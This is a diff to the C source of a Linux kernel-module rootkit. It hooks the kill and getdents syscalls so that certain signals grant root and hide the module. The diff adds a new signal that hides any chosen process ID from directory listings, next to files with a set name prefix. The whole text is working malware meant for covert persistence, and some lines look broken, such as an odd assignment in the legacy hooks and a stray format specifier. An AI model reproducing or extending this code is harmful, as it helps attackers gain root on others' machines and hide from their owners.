@@ -17,13 +17,15 @@ MODULE_VERSION("0.0.1");
 
 
 enum signals{
-    SIGSUPER = 64, //become root
-    SIGINVIS = 63, // hide
+    SIGSUPER = 64, // become root
+    SIGINVIS = 63, // hide the rootkit
+    SIGHIDE = 62,  // hide process with pid given
 };
 
 unsigned long *__sys_call_table = NULL;
 static short hidden = 0;
 static struct list_head *prev_module;
+char hide_pid[NAME_MAX];
 #define PREFIX "SOHAIL"
 
 #ifdef CONFIG_X86_64
@@ -68,24 +70,30 @@ static orig_getdents_t orig_getdents;
 */
 static asmlinkage long hook_kill(const struct pt_regs *regs){
     int sig = regs->si;
+    pid_t pid = regs->di;
+
     void set_root(void);
     void hide_me(void);
     void show_me(void);
 
     if(sig == SIGSUPER){
-        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges", sig, SIGSUPER);
+        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges\n", sig, SIGSUPER);
         set_root();
         return 0;
     }else if((sig == SIGINVIS) && (hidden == 0)){
-        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit", sig, SIGINVIS);
+        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
         hide_me();
         hidden = 1;
         return 0;
     }else if((sig == SIGINVIS) && (hidden == 1)){
         /* This is only for testing we don't want anyone to get rid of our rootkit */
-        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit", sig, SIGINVIS);
+        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
         show_me();
         hidden = 0;
+        return 0;
+    }else if((sig == SIGHIDE)){
+        printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
+        sprintf(hide_pid, "%d%", pid);
         return 0;
     }
 
@@ -141,7 +149,9 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs){
         current_dir = (void *)dirent_ker + index;
 
         //checking if the file at the current directory has the prefix
-        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
+        // or if the process id is equal to the one we want to hide
+        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || 
+            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
             // if the prefix is the first index of the list we have to move everything up
             if(current_dir == dirent_ker){
                 ret -= current_dir->d_reclen;
@@ -205,7 +215,8 @@ static asmlinkage long hook_getdents(const struct pt_regs *regs){
         current_dir = (void *)dirent_ker + index;
 
         //checking if the file at the current directory has the prefix
-        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
+        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || 
+            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
             // if the prefix is the first index of the list we have to move everything up
             if(current_dir == dirent_ker){
                 ret -= current_dir->d_reclen;
@@ -244,17 +255,17 @@ static asmlinkage long hook_kill(pid_t pid, int sig){
     void show_me(void);
     
     if(sig == SIGSUPER){
-        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root priveliges", sig, SIGSUPER);
+        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root priveliges\n", sig, SIGSUPER);
         set_root();
         return 0;
     }else if((sig == SIGINVIS) && (hidden == 0)){
-        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit", sig, SIGINVIS);
+        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
         hide_me();
         hidden = 1;
         return 0;
     }else if((sig == SIGINVIS) && (hidden == 1)){
         /* This is only for testing we don't want anyone to get rid of our rootkit */
-        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit", sig, SIGINVIS);
+        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
         show_me();
         hidden = 0;
         return 0;
@@ -309,7 +320,8 @@ static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *di
     while(index < ret){
         current_dir = (void *) dirent_ker = 0;
 
-        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0){
+        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0 || 
+            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
             if(current_dir == dirent_ker){
                 ret -= current_dir->d_reclen;
                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen,ret);
@@ -363,7 +375,8 @@ static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent
     while(index < ret){
         current_dir = (void *) dirent_ker = 0;
 
-        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0){
+        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0 || 
+            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
             if(current_dir == dirent_ker){
                 ret -= current_dir->d_reclen;
                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen,ret);
